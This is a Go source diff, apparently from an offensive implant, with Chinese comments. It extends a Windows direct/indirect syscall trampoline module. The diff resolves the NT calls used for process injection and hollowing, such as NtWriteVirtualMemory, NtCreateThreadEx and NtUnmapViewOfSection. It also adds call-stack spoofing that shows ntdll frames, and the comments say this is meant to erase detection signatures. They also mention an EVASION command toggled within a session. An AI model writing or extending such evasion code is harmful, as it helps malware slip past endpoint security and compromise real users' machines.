@@ -31,11 +31,27 @@ var (
 
 	// 按模式构建的 trampoline
 	trampolines map[string]uintptr
+
+	// currentMode 已装配的 syscall 模式（direct/indirect）；空表示未装配
+	currentMode string
 )
 
 type syscallInfo struct {
 	ssn         uintptr // syscall 号
 	syscallAddr uintptr // ntdll 内 syscall 指令地址
+}
+
+// syscallNames 需要提前解析的 NtXxx 名单。
+// 独立成变量是为了让测试能直接遍历它（少解析一个都可能是「静默退化」）。
+var syscallNames = []string{
+	"NtCreateThreadEx",
+	"NtProtectVirtualMemory",
+	"NtAllocateVirtualMemory",
+	"NtWriteVirtualMemory",
+	"NtReadVirtualMemory",
+	"NtOpenProcess",
+	"NtUnmapViewOfSection",
+	"NtQueryInformationProcess",
 }
 
 // PrepareTrampolines 解析常用 NtXxx 的 SSN 并构建 trampoline（direct/indirect）。
@@ -50,14 +66,7 @@ func PrepareTrampolines(mode string) error {
 	ntdllAddr = uintptr(unsafe.Pointer(ntdll.Handle)) // ntdll 基址（LoadDLL 句柄=模块基址）
 	trampolines = make(map[string]uintptr)
 
-	names := []string{
-		"NtCreateThreadEx",
-		"NtProtectVirtualMemory",
-		"NtAllocateVirtualMemory",
-		"NtWriteVirtualMemory",
-		"NtOpenProcess",
-	}
-	for _, name := range names {
+	for _, name := range syscallNames {
 		info, err := resolveSyscallInfo(name)
 		if err != nil {
 			continue // 缺失的系统调用跳过（版本差异）
@@ -71,6 +80,15 @@ func PrepareTrampolines(mode string) error {
 	}
 	if len(trampolines) == 0 {
 		return errors.New("未解析到任何系统调用信息")
+	}
+	currentMode = mode
+	// direct 模式额外装配「伪栈」：direct 的 syscall 指令落在我们自己的页上，
+	// 栈上又是 Go 运行时帧，两处都是特征；把栈换成 ntdll 帧链至少消掉一处。
+	// indirect 不做（收益来自"syscall 在 ntdll 内"，枢轴会破坏它的返回路径）。
+	if mode == ModeDirect {
+		if err := PrepareSpoof(); err != nil {
+			debug("栈伪造装配失败（回退普通 direct syscall）: %v", err)
+		}
 	}
 	return nil
 }
@@ -119,8 +137,22 @@ func buildTrampoline(mode string, info syscallInfo) (uintptr, error) {
 	return base, nil
 }
 
+// HasTrampoline 报告指定系统调用是否已准备好 trampoline。
+//
+// 调用方（注入 / 镂空）用它做"这一步能不能走 syscall"的判断：未准备就安静回退
+// 宿主 API，而不是等到调用时报错。trampolines 为 nil（未启用 syscall 模式）时返回 false。
+func HasTrampoline(name string) bool {
+	_, ok := trampolines[name]
+	return ok
+}
+
 // Syscall 通用执行（最多 8 个参数；参数按 Windows x64 调用约定由 Go runtime 放置）。
 // 返回 syscall 的 NTSTATUS。
+//
+// direct 模式下若伪栈装配成功且 stackSpoof 开关为开，走 spoofed 路径（栈上呈现
+// ntdll 帧链）；开关关、参数过多或装配失败时静默回退到普通 direct 执行，行为不变。
+// 门控每次调用都重新判定，所以 EVASION 命令可以在会话内把它关掉（对已经发生的
+// 调用无效，这是"栈"的物理性质：调用栈只在调用发生的那一刻存在）。
 func Syscall(name string, args ...uintptr) (uintptr, error) {
 	tramp, ok := trampolines[name]
 	if !ok {
@@ -129,6 +161,13 @@ func Syscall(name string, args ...uintptr) (uintptr, error) {
 	n := len(args)
 	if n > 8 {
 		return 0, errors.New("参数过多")
+	}
+	if currentMode == ModeDirect && len(args) <= SpoofMaxArgs && SpoofActive() {
+		if info, ok := resolved[name]; ok {
+			if status, err := syscallSpoofed(uint32(info.ssn), args); err == nil {
+				return status, nil
+			}
+		}
 	}
 	callArgs := make([]uintptr, 9)
 	callArgs[0] = tramp
